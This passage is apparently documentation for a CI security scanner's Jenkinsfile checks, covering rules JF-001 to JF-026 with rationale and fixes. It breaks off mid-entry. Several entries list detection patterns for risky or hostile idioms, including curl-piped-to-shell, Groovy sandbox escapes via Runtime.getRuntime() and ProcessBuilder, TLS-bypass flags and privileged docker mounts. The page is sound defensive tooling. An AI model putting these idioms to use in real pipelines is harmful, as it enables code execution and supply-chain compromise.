# Jenkins provider

Parses Jenkinsfile text. Declarative or Scripted Pipeline, without
talking to a Jenkins controller. No Groovy interpreter, no plugin
install, no API token.

## Producer workflow

```bash
# --jenkinsfile-path is auto-detected when ./Jenkinsfile exists at cwd.
pipeline_check --pipeline jenkins

# …or pass it explicitly.
pipeline_check --pipeline jenkins --jenkinsfile-path Jenkinsfile

# Scan a directory of multiple Jenkinsfiles (e.g. monorepo with per-app pipelines).
pipeline_check --pipeline jenkins --jenkinsfile-path ci/
```

The loader recognizes files named `Jenkinsfile` exactly, plus anything
ending in `.jenkinsfile` or `.groovy`. It treats every file as text,
no Groovy parsing, and applies the same regex-driven heuristics the
other workflow providers use for `run:` blocks. False positives are
intentional: better to flag and let the operator suppress than to
miss a real injection because the parser couldn't follow a dynamic
expression.

## What it covers

39 checks · 12 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [JF-001](#jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-002](#jf-002) | Script step interpolates attacker-controllable env var | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-003](#jf-003) | Pipeline uses `agent any` (no executor isolation) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-004](#jf-004) | AWS auth uses long-lived access keys via withCredentials | <span class="pg-sev pg-sev--medium">MEDIUM</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-005](#jf-005) | Deploy stage missing manual `input` approval | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-006](#jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-007](#jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-008](#jf-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-009](#jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-010](#jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-011](#jf-011) | Pipeline has no `buildDiscarder` retention policy | <span class="pg-sev pg-sev--low">LOW</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-012](#jf-012) | `load` step pulls Groovy from disk without integrity pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-013](#jf-013) | copyArtifacts ingests another job's output unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [JF-014](#jf-014) | Agent label missing ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-015](#jf-015) | Pipeline has no `timeout` wrapper, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-016](#jf-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-017](#jf-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-018](#jf-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-019](#jf-019) | Groovy sandbox escape pattern detected | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [JF-020](#jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-021](#jf-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-022](#jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-023](#jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-024](#jf-024) | `input` approval step missing submitter restriction | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-025](#jf-025) | Kubernetes agent pod template runs privileged or mounts hostPath | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-026](#jf-026) | `build job:` trigger ignores downstream failure | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-027](#jf-027) | `archiveArtifacts` does not record a fingerprint | <span class="pg-sev pg-sev--low">LOW</span> |  |
| [JF-028](#jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-029](#jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [JF-030](#jf-030) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-031](#jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [JF-032](#jf-032) | Agent label interpolates attacker-controllable value | <span class="pg-sev pg-sev--high">HIGH</span> | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [JF-033](#jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-034](#jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-035](#jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-036](#jf-036) | Script step interpolates a build parameter (params.*) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-037](#jf-037) | Untrusted PR/build context reaches an agentic AI CLI (prompt injection) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-038](#jf-038) | Agentic CLI output lands without human review | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [JF-039](#jf-039) | ML model loaded with trust_remote_code (code execution) | <span class="pg-sev pg-sev--high">HIGH</span> |  |

---

<div class="pg-rule pg-rule--high" markdown>

## JF-001: Shared library not pinned to a tag or commit { #jf-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

`@main`, `@master`, `@develop`, no-`@ref`, and any non-semver / non-SHA ref are floating. Whoever controls the upstream library can ship code into your build by pushing to that branch.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-002: Script step interpolates attacker-controllable env var { #jf-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

$BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are populated from SCM event metadata the attacker controls. Single-quoted Groovy strings don't interpolate so they're safe; only double-quoted / triple-double-quoted bodies are flagged.

<div class="pg-rule__rec" markdown>

**Recommended action**

Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-003: Pipeline uses `agent any` (no executor isolation) { #jf-003 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-ENV</span> <span class="pg-tag pg-tag--esf">ESF-D-PRIV-BUILD</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

`agent any` is the broadest possible executor scope, any registered executor can be picked, including ones with broader IAM / file-system access than this build needs. A compromise of one job blast-radiates across every pool.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace `agent any` with `agent { label 'build-pool' }` (targeting a labeled pool) or `agent { docker { image '...' } }` (ephemeral container). Reserve broad-access agents for jobs that genuinely need them.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-004: AWS auth uses long-lived access keys via withCredentials { #jf-004 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-TOKEN-HYGIENE</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
</div>

Fires when BOTH a credentialsId containing `aws` is referenced AND an AWS key variable name appears (requires both so an OIDC role binding doesn't false-positive). Also fires when `withAWS(credentials: '…')` is used, the safe alternative is `withAWS(role: '…')`.

<div class="pg-rule__rec" markdown>

**Recommended action**

Switch to the AWS plugin's IAM-role / OIDC binding (e.g. `withAWS(role: 'arn:aws:iam::…:role/jenkins')`) so each build assumes a short-lived role. Remove the static AWS_ACCESS_KEY_ID secret from the Jenkins credentials store once the role is in place.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-005: Deploy stage missing manual `input` approval { #jf-005 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-284</span>
</div>

A stage named `deploy` / `release` / `publish` / `promote` should either use the declarative `input { ... }` directive or call `input message: ...` somewhere in its body. Without one, any push that triggers the pipeline ships to the target with no human review.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add an `input` step to every deploy-like stage (e.g. `input message: 'Promote to prod?', submitter: 'releasers'`). Combine with a Jenkins folder-scoped permission so only release engineers see the prompt.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-006: Artifacts not signed { #jf-006 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-D-SIGN-ARTIFACTS</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
</div>

Passes when cosign / sigstore / slsa-* / notation-sign appears in executable Jenkinsfile text (comments are stripped before matching).

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a `sh 'cosign sign --yes …'` step (the cosign-installer Jenkins plugin handles binary install). Publish the signature next to the artifact and verify it at deploy.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-007: SBOM not produced { #jf-007 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-D-SBOM</span> <span class="pg-tag pg-tag--cwe">CWE-1104</span>
</div>

Passes when a direct SBOM tool token (CycloneDX, syft, anchore, spdx-sbom-generator, sbom-tool) appears in executable code, or when Trivy is paired with `sbom` / `cyclonedx` in the same file. Comments are stripped before matching.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format cyclonedx`) and archive the result with `archiveArtifacts`.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## JF-008: Credential-shaped literal in pipeline body { #jf-008 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span>
</div>

Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Values inside ``environment {}`` blocks also run through the keyed-hex and entropy passes (which need YAML-key context to fire). Secrets committed to Groovy source are visible in every fork and every build log.

**Known false-positive modes**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.

<div class="pg-rule__rec" markdown>

**Recommended action**

Rotate the exposed credential. Move the value to a Jenkins credential and reference it via `withCredentials([string(credentialsId: '…', variable: '…')])`.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-009: Agent docker image not pinned to sha256 digest { #jf-009 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-IMMUTABLE</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

`agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.

<div class="pg-rule__rec" markdown>

**Recommended action**

Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-010: Long-lived AWS keys exposed via environment {} block { #jf-010 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--esf">ESF-D-TOKEN-HYGIENE</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
</div>

Flags `environment { AWS_ACCESS_KEY_ID = '...' }` when the value is a literal or plain variable reference. Skips `credentials('id')` helpers and `${env.X}` that resolve at runtime. Matches both multiline and inline `environment { ... }` forms.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.

</div>

</div>

<div class="pg-rule pg-rule--low" markdown>

## JF-011: Pipeline has no `buildDiscarder` retention policy { #jf-011 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-10</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-LOGS</span> <span class="pg-tag pg-tag--esf">ESF-C-AUDIT</span> <span class="pg-tag pg-tag--cwe">CWE-532</span>
</div>

Without a retention policy, build logs accumulate indefinitely; a secret that once leaked into a log stays visible to anyone who can read jobs. Recognizes declarative `options { buildDiscarder(...) }`, scripted `properties([buildDiscarder(...)])`, and bare `logRotator(...)`.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add `options { buildDiscarder(logRotator(numToKeepStr: '30', daysToKeepStr: '90')) }` (declarative) or the `properties([buildDiscarder(...)])` equivalent in scripted pipelines. Tune the numbers to your retention policy.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-012: `load` step pulls Groovy from disk without integrity pin { #jf-012 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

`load 'foo.groovy'` evaluates whatever exists at the path when the build runs, there's no integrity check, so a workspace mutation can swap the loaded code between runs.

<div class="pg-rule__rec" markdown>

**Recommended action**

Move shared Groovy into a Jenkins shared library (`@Library('name@<sha>')`). Those are version-pinned and JF-001 audits them. Reserve `load` for one-off development experiments.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## JF-013: copyArtifacts ingests another job's output unverified { #jf-013 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-014: Agent label missing ephemeral marker { #jf-014 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-ENV</span> <span class="pg-tag pg-tag--esf">ESF-D-PRIV-BUILD</span> <span class="pg-tag pg-tag--cwe">CWE-269</span>
</div>

Static Jenkins agents that persist between builds leak workspace files and process state. The check looks for an `ephemeral` substring in `agent { label '...' }` blocks.

**Known false-positive modes**

- The check looks for the literal substring ``ephemeral`` in the agent label. Teams that use a different convention (``temp``, ``runner-pool``, org-specific ARC labels) trip the rule even when their runners are auto-scaled and ephemeral in fact. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH``.

<div class="pg-rule__rec" markdown>

**Recommended action**

Register Jenkins agents with ephemeral lifecycle (e.g. Kubernetes pod templates or EC2 Fleet plugin) and include `ephemeral` in the label string so the pipeline declares its expectation.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-015: Pipeline has no `timeout` wrapper, unbounded build { #jf-015 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-TIMEOUT</span> <span class="pg-tag pg-tag--cwe">CWE-400</span>
</div>

Without a `timeout()` wrapper, the pipeline runs until the Jenkins controller's global timeout (or indefinitely if none is configured). Explicit timeouts cap blast radius and the window during which a compromised step has workspace access.

<div class="pg-rule__rec" markdown>

**Recommended action**

Wrap the pipeline body or individual stages with `timeout(time: N, unit: 'MINUTES') { … }`. Without an explicit timeout, the build runs until the Jenkins global default (or indefinitely).

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-016: Remote script piped to shell interpreter { #jf-016 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a Jenkinsfile. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Known false-positive modes**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

<div class="pg-rule__rec" markdown>

**Recommended action**

Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## JF-017: Docker run with insecure flags (privileged/host mount) { #jf-017 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-ENV</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a Jenkinsfile give the container full access to the build agent, enabling container escape and lateral movement.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-018: Package install from insecure source { #jf-018 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a Jenkinsfile. These patterns allow man-in-the-middle injection of malicious packages.

<div class="pg-rule__rec" markdown>

**Recommended action**

Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## JF-019: Groovy sandbox escape pattern detected { #jf-019 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-250</span>
</div>

Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-020: No vulnerability scanning step { #jf-020 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VULN-MGMT</span> <span class="pg-tag pg-tag--cwe">CWE-1104</span>
</div>

Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-021: Package install without lockfile enforcement { #jf-021 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

<div class="pg-rule__rec" markdown>

**Recommended action**

Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-022: Dependency update command bypasses lockfile pins { #jf-022 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Known false-positive modes**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-023: TLS / certificate verification bypass { #jf-023 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-295</span>
</div>

Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-024: `input` approval step missing submitter restriction { #jf-024 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-284</span>
</div>

JF-005 already flags deploy stages with no ``input`` step. This rule catches the subtler case: the gate exists, but it doesn't actually restrict approvers. ``submitter`` accepts a comma-separated list of Jenkins usernames and group names; scope it to the smallest release-eligible pool.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a ``submitter: 'releasers,sre'`` (or a single role) argument to every ``input`` step in a deploy-like stage. Without it, any user with the Jenkins job ``Build`` permission can approve a production promotion, the approval gate becomes advisory.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-025: Kubernetes agent pod template runs privileged or mounts hostPath { #jf-025 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-ENV</span> <span class="pg-tag pg-tag--cwe">CWE-250</span> <span class="pg-tag pg-tag--cwe">CWE-276</span>
</div>

JF-017 flags inline ``docker run`` commands. This rule targets the other privileged-mode entry point: Jenkins' Kubernetes plugin lets pipelines declare ``agent { kubernetes { yaml '''...''' } }``. A pod running with ``privileged: true`` or mounting ``hostPath: /`` gives the build container the same blast radius, container escape, node-credential theft, cross-tenant contamination on a shared cluster.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove ``privileged: true`` from the embedded pod YAML, drop ``hostPath``/``hostNetwork``/``hostPID``/``hostIPC`` entries, and add a ``securityContext`` with ``runAsNonRoot: true`` and a ``readOnlyRootFilesystem``. If Docker-in-Docker is genuinely required, use a rootless daemon (e.g. sysbox) or run the build on a dedicated privileged pool with stricter branch protection.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-026: `build job:` trigger ignores downstream failure { #jf-026 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-754</span>
</div>

The Jenkins Pipeline plugin defaults ``wait`` to ``true`` and ``propagate`` to ``true``, but either can be flipped per call. ``wait: false`` returns immediately; ``propagate: false`` continues even when the downstream job fails or is aborted. Both patterns sever the flow-control link between the upstream approval gate and the work the downstream job is about to do.

<div class="pg-rule__rec" markdown>

**Recommended action**

